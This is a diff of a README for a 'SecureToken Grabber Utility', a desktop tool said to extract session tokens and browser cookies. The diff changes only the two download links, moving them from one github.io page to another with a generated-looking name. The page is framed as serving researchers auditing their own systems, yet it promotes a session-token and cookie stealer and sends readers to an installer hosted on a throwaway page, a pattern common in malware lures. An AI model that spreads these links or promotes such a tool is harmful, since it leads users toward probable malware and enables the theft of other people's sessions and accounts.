@@ -2,7 +2,7 @@
 
 SecureToken Grabber Utility 2026 is a comprehensive desktop application designed for the extraction and management of session tokens and browser cookies across a variety of platforms. This tool serves as a multi-purpose session token grabber, offering a streamlined interface for researchers, security analysts, and system administrators to audit and recover active sessions on their own systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What This Tool Does
 
@@ -56,7 +56,7 @@ A: The tool is regularly updated. As of 2026, it supports the latest stable desk
 
 Get the latest version of the SecureToken Grabber Utility from our official distribution page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: November 2026 — Version 4.1.0*
 *Copyright © 2026 SecureToken Project. For authorized use only.*
